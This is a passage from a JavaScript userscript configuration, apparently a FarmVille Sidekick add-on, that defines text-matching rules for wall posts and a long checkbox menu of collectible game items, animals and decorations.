				{search:["title","caption"],find:"{%1} horse", subTests:horseTypes, ret:"adopt_horse{%1}"},
				
				//catchall for known animal adoption
				{search:["title","caption"],find:"{%1}", subTests:[].concat(otherAnimals,babyAnimals).fixOrder(), ret:"adopt_{%1}"},

				//simply by link texts
				//here we create an array on the fly for special words, then we add other predefined arrays, then we fix the order before searching
				{link:"{%1}", subTests:["coins","bushel","perfect bunch","tree"].concat(decorTypes,materials,otherWords).fixOrder(), ret:"{%1}"},
				
				//simply by body text
				{search:["title","caption"],find:"{%1}", subTests:["coins","bushel","perfect bunch","tree"].concat(decorTypes,materials,otherWords).fixOrder(), ret:"{%1}"},

				//animal catchalls
				//these need to run after ALL other tests because they have text that may be misidentified earlier
				{search:["title","caption"],find:"{%1}", subTests:animalCatchalls, ret:"adopt_{%1}"},
				
				//created for 'user has shared a link' posts
				{title:"{%1}", ret:"none",
					subTests:["upgrading","good progress","addition of a station","half-way","halfway","finished","expanding","completion of","upgrade of","progress on","built a","adding stations","adding a station"],
					kids:[{title:"{%1}",ret:"mat_{%1}",subTests:buildings}]
				},
				{title:"looking for lava in all the wrong places",ret:"mat_volcanoreef"},
				{search:["desc"],find:"{%1}",subTests:materials,ret:"{%1}"},
				{search:["desc"],find:"{%1}",subTests:otherAnimals,ret:"adopt_(%1}"},
				{search:["desc"],find:"is building their {%1}",subTests:buildings,ret:"mat_{%1}"},
				{search:["desc"],find:["ranked 3 in the Rainbow Harvest Fest","100 xp"],ret:"100xp"},
				{search:["desc"],find:"is raising a sweet Baby Sea Animal",ret:"none",kids:[
					{img:"241413129ffa5dc7e97af3edf0460781",ret:"sea_rare"},
					{img:"57ca62ee6fb4b67333c3bbb4a07f839b",ret:"sea_common"},
				]},
				{search:["desc"],find:"{%1}",subTests:decorTypes,ret:"{%1}"},
				{caption:"{%1}",subTests:decorTypes,ret:"{%1}"},
			],

			//build the menu just as you would for FVWM except omit default values
			//if this script moves, be sure to change the userscripts source id for the link below
			//it should be the same number as in the @require line on top of this script

			menu: {
				section_main:{type:'section',label:'FarmVille ('+version+')',kids:{

				updateSidekick:{type:'link',label:'Update Sidekick',href:'http://userscripts.org/scripts/source/111560.user.js'},
				donateSidekick:{type:'link',label:'Donate Sidekick',href:'https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=F6XTNT3LKCB4A&lc=US&item_name=Donald%20Mapes&currency_code=USD&bn=PP%2dDonationsBF%3abtn_donate_LG%2egif%3aNonHosted'},
				basicsep:{type:'separator',label:'Basics',kids:{
				basictab:{type:'tab',label:'Basics',kids:{
					coins:{type:'checkbox',label:"Bonuses (Coins)"},
					coconuts:{type:'checkbox',label:"Coconuts"},
					currencybundle:{type:'checkbox',label:"Currency Bundle"},
					"100xp":{type:'checkbox',label:"XP"},
					zp:{type:'checkbox',label:"ZP (Zen Points)"},
					sp:{type:'checkbox',label:"SP (Spook Points)"},
					cp:{type:'checkbox',label:"CP (Cheer Points)"},
					doUnknown:{type:'checkbox',label:"Process Unrecognized Posts"},
					dontsteal:{type:'checkbox',label:"Don't Process W2W Posts"},
				}},

				animalfeedsep:{type:'tab',label:"Animal Feed",kids:{
					feedblock:{type:'optionblock',label:"Feed Types:",kids:{
						animalfeed:{type:'checkbox',label:"Animal Feed"},
						dogtreat:{type:'checkbox',label:"Dog Treat"},
						gophertreat:{type:'checkbox',label:"Gopher Treat"},
						pigchow:{type:'checkbox',label:"Pig Chow"},
						puppykibble:{type:'checkbox',label:"Puppy Kibble"},
					}},
					dogtreatblock:{type:'optionblock',label:"Dog Treats:",kids:{
						cupcakedogtreat:{type:'checkbox',label:"Cupcake"},
						sportydogtreat:{type:'checkbox',label:"Sporty"},
						sturdydogtreat:{type:'checkbox',label:"Sturdy"},
						sunshinedogtreat:{type:'checkbox',label:"Sunshine"},
					}}
				}},

				boostssep:{type:'tab',label:"Consumables",kids:{
					boostblock:{type:'optionblock',label:"Consumables:",kids:{
						arborist:{type:'checkbox',label:"Arborist"},
						carepackage:{type:'checkbox',label:"Care Package"},
						doubleavatar:{type:'checkbox',label:"Double Avatar"},
						farmhand:{type:'checkbox',label:"Farmhand"},
						fertilizeall:{type:'checkbox',label:"Fertilize All"},
						fuel:{type:'checkbox',label:"Fuel"},
						instagrow:{type:'checkbox',label:"Instagrow"},
						lovepotion:{type:'checkbox',label:"Love Potion"},
						mysterygamedart:{type:'checkbox',label:"Mystery Game Dart"},
						turbocharger:{type:'checkbox',label:"Turbo Charger"},
						unwither:{type:'checkbox',label:"Unwither"},
					}},

					sampleblock:{type:'optionblock',label:"Crafting Samples (for fuel) By Level:", kids:{
						sample1:{type:'checkbox',label:"1-20"},
						sample2:{type:'checkbox',label:"21-40"},
						sample3:{type:'checkbox',label:"41-80"},
						sample4:{type:'checkbox',label:"80-100"},
						sample5:{type:'checkbox',label:"100+"},
						sample:{type:'checkbox',label:"??"},
					}},					
		
					mysteryblock:{type:'optionblock',label:"Other:",kids:{
						mysterygift:{type:'checkbox',label:"Mystery Gift"},
						specialdelivery:{type:'checkbox',label:"Special Delivery"},
						capitalonegift:{type:'checkbox',label:"Capital One Gift"},
					}}
				}},

				eggsep:{type:'tab',label:"Eggs",kids:{
					eggblock:{type:'optionblock',label:"Mystery Eggs:",kids:createMenuFromArray(eggTypes,'egg_')},
					eggblock2:{type:'optionblock',label:"Bunny Eggs:",kids:createMenuFromArray(eggTypes2,'egg_')},
				}},

				trufflesep:{type:'tab',label:"Truffles",kids:{
					truffleblock:{type:'optionblock',label:"Truffles",kids:{
						browntruffle:{type:'checkbox',label:"Brown"},
						blacktruffle:{type:'checkbox',label:"Black"},
						whitetruffle:{type:'checkbox',label:"White"},
						goldtruffle:{type:'checkbox',label:"Gold"},
					}}
				}},

				//here we make use of the new function createMenuFromArray
				//we can make whole menu blocks from a single array
				//that function sorts the array by alphabetical order for you
				//and also capitalizes words for better display with the menu

				/*craftsep:{type:'tab',label:"Craft Samples",kids:{
					craftbakeryblock:{type:'optionblock',label:"Bakery:",kids:createMenuFromArray(craftBakery,'sample_')},
					craftspablock:{type:'optionblock',label:"Spa:",kids:createMenuFromArray(craftSpa,'sample_')},
					craftwineryblock:{type:'optionblock',label:"Winery:",kids:createMenuFromArray(craftWinery,'sample_')},
					craftpubblock:{type:'optionblock',label:"Pub:",kids:createMenuFromArray(craftPub,'sample_')},
					craftrestrauntblock:{type:'optionblock',label:"Restraunt",kids:createMenuFromArray(craftRestraunt,'sample_')},
				}},*/
		
				helpsep:{type:'tab',label:"Tasks",kids:{
					helpblock:{type:'optionblock',label:"Participate in:",kids:{
						sendhelp:{type:'checkbox',label:"Barn Raisings & Send Help (SOGO/Quest Items)"},
						bushel_random:{type:'checkbox',label:"Crafting Workshops (random bushel)"},
					}},
					sendall:{type:'checkbox',label:"Send All Requested Items or Select From Below (also does barn raisings)"},
					sendblock:{type:'optionblock',label:"Send Neighbors:",kids:{
						sendmat:{type:'checkbox',label:"Consumables/Materials"},
						sendwishlist:{type:'checkbox',label:"Wishlists"},
						sendfeed:{type:'checkbox',label:"Animal Feed"},
						sendbottle:{type:'checkbox',label:"Bottles"},
						sendbushel:{type:'checkbox',label:"Bushels"},
						sendbasket:{type:'checkbox',label:"Baskets"},
						sendturkey:{type:'checkbox',label:"Turkeys"},
					}},
				}},

				matsep:{type:'tab',label:"Materials",kids:{
					matbybuilding:{type:'optionblock',label:'Random Materials by Building: (does not automatically include items below)',kids:createMenuFromArray(buildings,'mat_')},
					matBlock:{type:'optionblock',label:"Standard:",kids:createMenuFromArray(standardMaterials,"")},
					matBlock2:{type:'optionblock',label:"Special:",kids:createMenuFromArray(specialMaterials,"")},
					matBlock6:{type:'optionblock',label:"Events:",kids:createMenuFromArray(specialEvents,"")},
					matBlock3:{type:'optionblock',label:"Crafing:",kids:createMenuFromArray(craftingMaterials,"")},
					matBlock4:{type:'optionblock',label:"Other:",kids:createMenuFromArray(otherWords,"")},
					matBlock5:{type:'optionblock',label:"Tarot Cards:",kids:{
						tarot_past:{type:'checkbox',label:"Past"},
						tarot_present:{type:'checkbox',label:"Present"},
						tarot_future:{type:'checkbox',label:"Future"},
						tarotcard:{type:'checkbox',label:"Random"},
					}}
				}},
				
				avatartab:{type:'tab',label:'Avatars',kids:{
					costumetab:{type:'optionblock',label:"Avatar Costumes:",kids:createMenuFromArray(avatar,"costume_")},
					costume:{type:'checkbox',label:"Unknown Costumes"},
				}},

				}}, //end basics section

				orchardsep:{type:'separator',label:"Orchard",kids:{
					mysteryseedling:{type:'checkbox',label:"Mystery Seedlings"},
					wateringcan:{type:'checkbox',label:"Watering Cans"},
					treestab1:{type:'tab',label:"Standard Trees",kids:{
						trees:{type:'optionblock',label:"Normal:",kids:createMenuFromArray(treeTypes,'tree_')},
					}},
					treestab2:{type:'tab',label:"Giant Trees",kids:{
						treeslg:{type:'optionblock',label:"Giant:",kids:createMenuFromArray(treeTypes2,'tree_giant')},
					}},
					treestab3:{type:'tab',label:"Bonsai Trees",kids:{
						treesbnsi:{type:'optionblock',label:"Bonsai:",kids:createMenuFromArray(treeTypes3,'tree_bonsai')},
					}},
					tree:{type:'checkbox',label:"Unknown Trees"},
				}},
				
				bloomsep:{type:'separator',label:"Bloom Garden",kids:{
					mysterybulb:{type:'checkbox',label:"Mystery Bulbs"},
					flowerfood:{type:'checkbox',label:"Flower Food"},
					bloomtab1:{type:'tab',label:"Blooms:",kids:{
						blooms:{type:'optionblock',label:"Flowers:",kids:createMenuFromArray(bulbTypes,'bulb_')},
						bulb_unknown:{type:'checkbox',label:"Unknown Bloom"},
					}},
				}},
				
				colsep:{type:'separator',label:"Collectibles",kids:{
					colBlock1:{type:'optionblock',label:"Berries:",kids:createMenuFromArray(colBerries,"col_")},
					colBlock2:{type:'optionblock',label:"Citrus:",kids:createMenuFromArray(colCitrus,"col_")},
					colBlock3:{type:'optionblock',label:"Cows:",kids:createMenuFromArray(colCows,"col_")},
					colBlock4:{type:'optionblock',label:"Flowers:",kids:createMenuFromArray(colFlowers,"col_")},				
					colBlock5:{type:'optionblock',label:"Grains:",kids:createMenuFromArray(colGrains,"col_")},				
					colBlock6:{type:'optionblock',label:"Squash:",kids:createMenuFromArray(colSquash,"col_")},				
					colBlockX:{type:'optionblock',label:"Unknown Collectibles by Collection:",kids:createMenuFromArray(colGroups,"colX_")},
				}},

				decosep:{type:'separator',label:"Decorations",kids:{
				decortab:{type:'tab',label:'Decorations',kids:{
				//	decoblock:{type:'optionblock',label:"Various Decorations and Odd Animals:",kids:createMenuFromArray(decorTypes,"")},
					decoBlock01:{type:'optionblock',label:"Halloween: (event-specific animals not included)",kids:createMenuFromArray(decorHalloween,"")},
					decoBlock02:{type:'optionblock',label:"Thanksgiving:",kids:createMenuFromArray(decorThanksgiving,"")},
					decoBlock03:{type:'optionblock',label:"Christmas:",kids:createMenuFromArray(decorChristmas,"")},
					decoBlock19:{type:'optionblock',label:"Winter Wonderland:",kids:createMenuFromArray(decorWinterWonderland,"")},
					decoBlock20:{type:'optionblock',label:"Holiday Hearth:",kids:createMenuFromArray(decorHolidayHearth,"")},
					decoBlock21:{type:'optionblock',label:"Magic Snowman:",kids:createMenuFromArray(decorMagicSnowman,"")},
					decoBlock05:{type:'optionblock',label:"Valentine's Day:",kids:createMenuFromArray(decorValentines,"")},
					decoBlock07:{type:'optionblock',label:"St. Patrick's Day:",kids:createMenuFromArray(decorStPatty,"")},
					decoBlock08:{type:'optionblock',label:"Wishing Well:",kids:createMenuFromArray(decorWishingWell,"")},
					decoBlock09:{type:'optionblock',label:"Easter:",kids:createMenuFromArray(decorEaster,"")},
					decoBlock11:{type:'optionblock',label:"Shovels:",kids:createMenuFromArray(decorShovels,"")},
					decoBlock12:{type:'optionblock',label:"School Supplies:",kids:createMenuFromArray(decorSchoolSupplies,"")},				
					decoBlock13:{type:'optionblock',label:"Tuscan Wedding:",kids:createMenuFromArray(decorTuscanWedding,"")},
					decoBlock14:{type:'optionblock',label:"Flowers:",kids:createMenuFromArray(decorFlowers,"")},
					decoBlock15:{type:'optionblock',label:" Birthday 2:",kids:createMenuFromArray(decorFV2Birthday,"")},
					decoBlock16:{type:'optionblock',label:"Sand Castle:",kids:createMenuFromArray(decorSandCastle,"")},
					decoBlock17:{type:'optionblock',label:"Bobbing For Apples:",kids:createMenuFromArray(decorApples,"")},
					decoBlock22:{type:'optionblock',label:"Gnomes:",kids:createMenuFromArray(decorGnomes,"")},
					decoBlock18:{type:'optionblock',label:"Other:",kids:createMenuFromArray(decorOther,"")},		
				}},
				
				flowerssep:{type:'tab',label:"Flowers",kids:{
					perfectblock1:{type:'optionblock',label:"Perfect Bunches:",kids:createMenuFromArray(flowerTypes,"perfect_")},
					perfectbunch:{type:'checkbox',label:"Unknown Bunches"},
				}},
				
				}}, // end decorations
				
				adoptsep:{type:'separator',label:"Adopt Specific Animals",kids:{
				bovinetab:{type:'tab',label:"Cows & Calves",kids:{
					cowBlock:{type:'optionblock',label:"Cows:",kids:createMenuFromArray(cowTypes,"adopt_cow")},
					bullblock:{type:'optionblock',label:"Bulls:",kids:{
						adopt_flowerbull:{type:'checkbox',label:"Flower Bull"},
					}},
					calfBlock:{type:'optionblock',label:"Calves:",kids:createMenuFromArray(calfTypes,"adopt_calf")},
					bullBlock:{type:'optionblock',label:"Bull Calves:",kids:createMenuFromArray(bullTypes,"adopt_calf")},
					oxenBlock:{type:'optionblock',label:"Baby Oxen:",kids:createMenuFromArray(oxenTypes,"adopt_calf")},
					adopt_calf:{type:'checkbox',label:"Unknown Calves"},
				}},
				equinetab:{type:'tab',label:"Horses & Foals",kids:{
					horseBlock:{type:'optionblock',label:"Horses:",kids:{
						adopt_amethystunicorn:{type:'checkbox',label:"Amethyst Unicorn"},
						adopt_auroraunicorn:{type:'checkbox',label:"Aurora Unicorn"},
						adopt_batpegacorn:{type:'checkbox',label:"Bat Pegacorn"},
						adopt_horseblack:{type:'checkbox',label:"Black"},
						adopt_blackpony:{type:'checkbox',label:"Black Pony"},
						adopt_horseblacksnowfantasy:{type:'checkbox',label:"Black Snow Fanstasy"},
						adopt_horsebrown:{type:'checkbox',label:"Brown"},
						adopt_horsebuckskinmini:{type:'checkbox',label:"Buckskin Mini"},
						adopt_butterflycorn:{type:'checkbox',label:"Butterflycorn"},
						adopt_butterflypegacorn:{type:'checkbox',label:"Butterfly Pegacorn"},
						adopt_horsecandycorn:{type:'checkbox',label:"Candy Corn"},
						adopt_candycornunicorn:{type:'checkbox',label:"Candycorn Unicorn"},
						adopt_chateaustallion:{type:'checkbox',label:"Chateau Stallion"},
						adopt_horsecreamdraft:{type:'checkbox',label:"Cream Draft"},
						adopt_dreamunicorn:{type:'checkbox',label:"Dream Unicorn"},
						adopt_fairydonkey:{type:'checkbox',label:"Fairy Donkey"},
						adopt_horsefancy:{type:'checkbox',label:"Fancy"},
						adopt_horsefarmer:{type:'checkbox',label:"Farmer"},
						adopt_horsefirefly:{type:'checkbox',label:"Firefly"},
						adopt_horseflowered:{type:'checkbox',label:"Flowered"},
						adopt_horsegiving:{type:'checkbox',label:"Giving",newitem:true},
						adopt_horsegray:{type:'checkbox',label:"Gray"},
						adopt_horsegrey:{type:'checkbox',label:"Grey"},
						adopt_hostpegacorn:{type:'checkbox',label:"Host Pegacorn",newitem:true},
						adopt_horsejetset:{type:'checkbox',label:"Jet Set"},
						adopt_lifeofthepartypegacorn:{type:'checkbox',label:"Life Of The Party Pegacorn",newitem:true},
						adopt_lightbluepony:{type:'checkbox',label:"Light Blue Pony"},
						adopt_horsemodern:{type:'checkbox',label:"Modern"},
						adopt_moonpegasus:{type:'checkbox',label:"Moon Pegasus"},
						adopt_nightmarestallion:{type:'checkbox',label:"Nightmare Stallion"},
						adopt_horsenomadic:{type:'checkbox',label:"Nomadic"},
						adopt_nutcrackerstallion:{type:'checkbox',label:"Nutcracker Stallion"},
						adopt_horseoffice:{type:'checkbox',label:"Office"},
						adopt_horseopenroad:{type:'checkbox',label:"Open Road"},
						adopt_partygameunicorn:{type:'checkbox',label:"Party Game Unicorn"},
						adopt_horsepostierbrenton:{type:'checkbox',label:"Postier Brenton"},
						adopt_rainbowbodymustang:{type:'checkbox',label:"Rainbow Body Mustang"},
						adopt_horsered:{type:'checkbox',label:"Red"},
						adopt_horseredpinto:{type:'checkbox',label:"Red Pinto"},
						adopt_sapphireunicorn:{type:'checkbox',label:"Sapphire Unicorn"},
						adopt_smittenstallion:{type:'checkbox',label:"Smitten Stallion"},
						adopt_horsesparkle:{type:'checkbox',label:"Sparkle"},
						adopt_horsespider:{type:'checkbox',label:"Spider"},
						adopt_sunpegasus:{type:'checkbox',label:"Sun Pegasus"},
						adopt_horsesundae:{type:'checkbox',label:"Sundae"},
						adopt_summerdonkey:{type:'checkbox',label:"Summer Donkey"},
						adopt_vampiredonkey:{type:'checkbox',label:"Vampire Donkey"},
						adopt_vineyardsteed:{type:'checkbox',label:"Vineyard Steed"},
						adopt_horsevintage:{type:'checkbox',label:"Vintage"},
						adopt_whitemustang:{type:'checkbox',label:"White Mustang"},
						adopt_horsewhitesnowfantasy:{type:'checkbox',label:"White Snow Fantasy"},
						adopt_horsewrapped:{type:'checkbox',label:"Wrapped",newitem:true},
					}},
					adopt_horse:{type:'checkbox',label:"Unknown Horses"},
					
					foalBlock:{type:'optionblock',label:"Foals:",kids:createMenuFromArray(foalTypes,"adopt_foal")},
					assBlock:{type:'optionblock',label:"Donkey Foals:",kids:createMenuFromArray(assTypes,"adopt_foal")},
					adopt_foal:{type:'checkbox',label:"Unknown Foals"},
				}},
				porcinetab:{type:'tab',label:"Pigs & Piglets",kids:{				
					pigBlock:{type:'optionblock',label:"Pigs:",kids:{
						adopt_boar:{type:'checkbox',label:"Boar"},
						adopt_yellowsow:{type:'checkbox',label:"Yellow Sow"},
						adopt_pig:{type:'checkbox',label:"Plain Pink"},
						adopt_pigblack:{type:'checkbox',label:"Black"},
						adopt_pigwhite:{type:'checkbox',label:"White"},
						adopt_pigstrawberry:{type:'checkbox',label:"Strawberry"},
						adopt_pighotpink:{type:'checkbox',label:"Hot Pink"},
						adopt_pigmaid:{type:'checkbox',label:"Maid"},
						adopt_pigmuddy:{type:'checkbox',label:"Muddy"},
						adopt_pigmudhole:{type:'checkbox',label:"Mudhole"},
						adopt_pigossabaw:{type:'checkbox',label:"Ossabaw"},
						adopt_pigpicasso:{type:'checkbox',label:"Picasso"},
						adopt_pigpinkpotbelly:{type:'checkbox',label:"Pink Pot Belly"},
						adopt_pigpoolside:{type:'checkbox',label:"Poolside"},
						adopt_pigghost:{type:'checkbox',label:"Ghost"},
						adopt_pigsnowflake:{type:'checkbox',label:"Snow Flake"},
					}},	
					pigletblock:{type:'optionblock',label:"Pig Pen Piglets:",kids:{
						adopt_piglet:{type:'checkbox',label:"Indeterminate"},
					}},
				}},
				sheepistab:{type:'tab',label:"Goats, Sheep & Lambs",kids:{				
					sheepBlock:{type:'optionblock',label:"Sheep:",kids:{
						adopt_sheepcaroling:{type:'checkbox',label:"Caroling"},
						adopt_sheepchocolate:{type:'checkbox',label:"Chocolate"},
						adopt_sheepconnoisseur:{type:'checkbox',label:"Connoisseur"},
						adopt_ewecounton:{type:'checkbox',label:"Count On Ewe"},
						adopt_diamondewe:{type:'checkbox',label:"Diamond Ewe"},
						adopt_sheepdwarfblue:{type:'checkbox',label:"Dwarf Blue"},
						adopt_sheepemerald:{type:'checkbox',label:"Emerald"},
						adopt_ramfloweredgreen:{type:'checkbox',label:'Flowered Green Ram'},
						adopt_sheepfruity:{type:'checkbox',label:"Fruity"},
						adopt_sheepgroomed:{type:'checkbox',label:"Groomed"},
						adopt_eweluv:{type:'checkbox',label:"Luv Ewe"},
						adopt_sheepminer:{type:'checkbox',label:"Miner"},
						adopt_sheepmouflon:{type:'checkbox',label:"Mouflon"},
						adopt_sheep:{type:'checkbox',label:"Plain White"},
						adopt_sheeppolkadot:{type:'checkbox',label:"Polkadot"},
						adopt_ram:{type:'checkbox',label:"Ram"},
						adopt_sheepred:{type:'checkbox',label:"Red"},
						adopt_rednosesheep:{type:'checkbox',label:"Red Nose"},
						adopt_sheepscuba:{type:'checkbox',label:"Scuba"},
						adopt_ewescared:{type:'checkbox',label:"Scared Ewe"},
						adopt_sheepshamrock:{type:'checkbox',label:"Shamrock"},
						adopt_sheepsmitten:{type:'checkbox',label:"Smitten"},
						adopt_sheepstarbright:{type:'checkbox',label:"Star Bright"},
						adopt_ewesunny:{type:'checkbox',label:"Sunny Ewe"},
						adopt_eweschooled:{type:'checkbox',label:"Schooled Ewe"},
						adopt_ewethank:{type:'checkbox',label:"Thank Ewe"},
						adopt_sheepwhiteninja:{type:'checkbox',label:"White Ninja"},
					}},

					goatBlock:{type:'optionblock',label:"Goats:",kids:{
						adopt_boergoat:{type:'checkbox',label:"Boer"},
						adopot_carolinggoat:{type:'checkbox',label:"Caroling"},
						adopt_redgoat:{type:'checkbox',label:"Red"},
						adopt_redtoggenburggoat:{type:'checkbox',label:"Red Toggenburg"},
						adopt_mouflongoat:{type:'checkbox',label:"Mouflon"},
					}},
					adopt_goat:{type:'checkbox',label:"Unknown Goats"},

					lambBlock:{type:'optionblock',label:"Lambs:",kids:{
						adopt_babylamb:{type:'checkbox',label:"Brown"},
						adopt_pinklamb:{type:'checkbox',label:"Pink"},
					}},

					lambBlock2:{type:'optionblock',label:"Sheep Pen Lambs:",kids:{
						adopt_lamb:{type:'checkbox',label:"Indeterminate Sex"},
						adopt_lambram:{type:'checkbox',label:"Known Male"},
						adopt_lambewe:{type:'checkbox',label:"Known Female"},
					}},
				}},
				duckustab:{type:'tab',label:"Ducks & Ducklings",kids:{				
					duckBlock:{type:'optionblock',label:"Ducks:",kids:{
						adopt_duckbanjo:{type:'checkbox',label:"Banjo"},
						adopt_duckbelted:{type:'checkbox',label:"Belted"},
						adopt_bluewingedteal:{type:'checkbox',label:"Blue Winged Teal"},
						adopt_duckbrandname:{type:'checkbox',label:"Brand Name"},
						adopt_duckclassic:{type:'checkbox',label:"Classic"},
						adopt_duckdiving:{type:'checkbox',label:"Diving"},
						adopt_duckwithgloves:{type:'checkbox',label:"Duck With Gloves"},
						adopt_duckwithmittens:{type:'checkbox',label:"Duck With Mittens"},
						adopt_duckgoldeneye:{type:'checkbox',label:"Goldeneye"},
						adopt_duckgoth:{type:'checkbox',label:"Goth"},
						adopt_duckhippie:{type:'checkbox',label:"Hippie"},
						adopt_ducklongtail:{type:'checkbox',label:"Longtail"},
						adopt_ducknerd:{type:'checkbox',label:"Nerd"},
						adopt_duckparty:{type:'checkbox',label:"Party"},
						adopt_duckugly:{type:'checkbox',label:"Ugly"},
						adopt_duckwarder:{type:'checkbox',label:"Warder"},
						adopt_duckwhitegrape:{type:'checkbox',label:"White Grape"},
					}},
					adopt_duck:{type:'checkbox',label:"Unknown Ducks"},

					ducklingBlock:{type:'optionblock',label:"Ducklings:",kids:{
						adopt_ducklingbrown:{type:'checkbox',label:"Brown"},
						adopt_ducklingblue:{type:'checkbox',label:"Blue"},
						adopt_ducklingred:{type:'checkbox',label:"Red"},
						adopt_ducklingyellow:{type:'checkbox',label:"Yellow"},
						adopt_ducklingugly:{type:'checkbox',label:"Ugly"},
					}},
					adopt_duckling:{type:'checkbox',label:"Unknown Ducklings"},
				}},
				
				mysterybabytab:{type:'tab',label:"Mystery Babies",kids:{
					wildlifeblock:{type:'optionblock',label:"Wildlife Habitat:",kids:{
						wildlife_common:{type:'checkbox',label:"Common"},
						wildlife_rare:{type:'checkbox',label:"Rare"},
					}},
					
					petrunblock:{type:'optionblock',label:"Pet Run:",kids:{
						petrun_common:{type:'checkbox',label:"Common"},
						petrun_rare:{type:'checkbox',label:"Rare"},
					}},

					zooblock:{type:'optionblock',label:"Zoo:",kids:{
						zoo_common:{type:'checkbox',label:"Common"},
						zoo_rare:{type:'checkbox',label:"Rare"},
					}},
					
					aviaryblock:{type:'optionblock',label:"Aviary:",kids:{
						aviary_common:{type:'checkbox',label:"Common"},
						aviary_rare:{type:'checkbox',label:"Rare"},
					}},
					
					livestockblock:{type:'optionblock',label:"Livestock Pen:",kids:{
						livestock_common:{type:'checkbox',label:"Common"},
						livestock_rare:{type:'checkbox',label:"Rare"},
					}},
					
					winterpenblock:{type:'optionblock',label:"Winter Animal Pen:",kids:{
						arctic_common:{type:'checkbox',label:"Common"},
						arctic_rare:{type:'checkbox',label:"Rare"},
					}},
					
					aquariumblock:{type:'optionblock',label:"Aquarium:",kids:{
						sea_common:{type:'checkbox',label:"Common"},
						sea_rare:{type:'checkbox',label:"Rare"},
					}},
					
					jadeblock:{type:'optionblock',label:"Jade Habitat:",kids:{
						jade_common:{type:'checkbox',label:"Common"},
						jade_rare:{type:'checkbox',label:"Rare"},
					}},
					
					jade1block:{type:'optionblock',label:"Jade Aquarium:",kids:{
						ocean_common:{type:'checkbox',label:"Common"},
						ocean_rare:{type:'checkbox',label:"Rare"},
					}},
					
					unknown_baby:{type:'checkbox',label:"Unknown Babies"},
				}},
				
				othertab:{type:'tab',label:"Other",kids:{
					dinoblock:{type:'optionblock',label:"Dino DNA Strand:",kids:createMenuFromArray(dnaTypes,"dna_")},
					gemblock:{type:'optionblock',label:"Gems:",kids:createMenuFromArray(gemTypes,"gem_")},
					scaleblock:{type:'optionblock',label:"Dragon Scales:",kids:createMenuFromArray(scaleTypes,"scale_")},
					serumblock:{type:'optionblock',label:"Monster Serum:",kids:createMenuFromArray(serumTypes,"serum_")},
					cuttingblock:{type:'optionblock',label:"Bonsai Cuttings:",kids:createMenuFromArray(cuttingTypes,"cutting_")},
					spiritblock:{type:'optionblock',label:"Animal Spirit:",kids:createMenuFromArray(spiritTypes,"spirit_")},
					fossilblock:{type:'optionblock',label:"Fossils:",kids:createMenuFromArray(fossilTypes,"fossil_")},
					pixieblock:{type:'optionblock',label:"Pixie Dust:",kids:createMenuFromArray(pixieTypes,"pixie_"),newitem:true},
				}},
				
				miscanimstab:{type:'tab',label:"Other Animals",kids:{
					babyBlock:{type:'optionblock',label:"Baby Animals:",kids:createMenuFromArray(babyAnimals,"adopt_")},
					
					bunny2Block:{type:'optionblock',label:"Bunnies:",kids:{
						adopt_bluelilybunny:{type:'checkbox',label:"Blue Lily"},
						adopt_goldfloppybunny:{type:'checkbox',label:"Gold Floppy"},
						adopt_pinkloppybunny:{type:'checkbox',label:"Pink Loppy"},
						adopt_purplepuffybunny:{type:'checkbox',label:"Purple Puffy"},
						adopt_whitedaisybunny:{type:'checkbox',label:"White Daisy"},
						adopt_yellowchubbybunny:{type:'checkbox',label:"Yellow Chubby"},
					}},
					
					catBlock:{type:'optionblock',label:"Cats:",kids:{
						adopt_americanbobtail:{type:'checkbox',label:"American Bobtail"},
						adopt_auroracat:{type:'checkbox',label:"Aurora"},
						adopt_blackkitten:{type:'checkbox',label:"Black"},
						adopt_himalayankitty:{type:'checkbox',label:"Himalayan"},
						adopt_persiancat:{type:'checkbox',label:"Persian"},
						adopt_tabbypersian:{type:'checkbox',label:"Tabby Persian"},
						adopt_whitekitty:{type:'checkbox',label:"White"},
					}},
					
					chickenBlock:{type:'optionblock',label:"Chickens:",kids:{
						adopt_cloverchicken:{type:'checkbox',label:"Clover"},
						adopt_corduroychicken:{type:'checkbox',label:"Corduroy"},
						adopt_dorkingchicken:{type:'checkbox',label:"Dorking"},
						adopt_earlybird:{type:'checkbox',label:"Early Bird"},
						adopt_firechicken:{type:'checkbox',label:"Fire"},
						adopt_gardenerchicken:{type:'checkbox',label:"Gardener"},
						adopt_hammerchicken:{type:'checkbox',label:"Hammer"},
						adopt_icechicken:{type:'checkbox',label:"Ice"},
						adopt_rhodeislandredchicken:{type:'checkbox',label:"Rhode Island Red"},
						adopt_chicken:{type:'checkbox',label:"White"},
					}},
					
					dragonBlock:{type:'optionblock',label:"Dragons:",kids:{
						adopt_arajirdragon:{type:'checkbox',label:"Arajir Dragon"},
						adopt_danomiredragon:{type:'checkbox',label:"Danomire Dragon"},
						adopt_etteriusdragon:{type:'checkbox',label:"Etterius Dragon"},
						adopt_furilichdragon:{type:'checkbox',label:"Furilich Dragon"},
						adopt_icecreamdragon:{type:'checkbox',label:"Ice Cream Dragon"},
						adopt_lemondragon:{type:'checkbox',label:"Lemon Dragon"},
						adopt_rosedragon:{type:'checkbox',label:"Rose Dragon"},
						adopt_sugardragon:{type:'checkbox',label:"Sugar Dragon"},
						adopt_tseliusdragon:{type:'checkbox',label:"Tselius Dragon",},
					}},
					
					gooseBlock:{type:'optionblock',label:"Geese:",kids:{
						adopt_farmgoose:{type:'checkbox',label:"Farm Goose"},
						adopt_whitegoose:{type:'checkbox',label:"White Goose"},
					}},
					
					llamaBlock:{type:'optionblock',label:"Llamas:",kids:{
						adopt_llama:{type:'checkbox',label:"Llama"},
						adopt_ponchollama:{type:'checkbox',label:"Poncho Llama"},
						adopt_whitellama:{type:'checkbox',label:"White Llama"},
					}},
					
					bunnyBlock:{type:'optionblock',label:"Rabbits:",kids:{
						adopt_arcticrabbit:{type:'checkbox',label:"Arctic"},
						adopt_bashfulbunny:{type:'checkbox',label:"Bashful Bunny"},
						adopt_blackrabbit:{type:'checkbox',label:"Black"},
						adopt_cloverrabbit:{type:'checkbox',label:"Clover"},
						adopt_dutchrabbit:{type:'checkbox',label:"Dutch"},
						adopt_englishspotrabbit:{type:'checkbox',label:"English Spot"},
						adopt_marathonhare:{type:'checkbox',label:"Marathon Hare"},
						adopt_redgraperabbit:{type:'checkbox',label:"Red Grape"},
						adopt_slyrabbit:{type:'checkbox',label:"Sly"},
						adopt_spottedloprabbit:{type:'checkbox',label:"Spotted Lop"},
						adopt_rabbit:{type:'checkbox',label:"White"},
					}},

					reindeerBlock:{type:'optionblock',label:"Reindeer:",kids:{
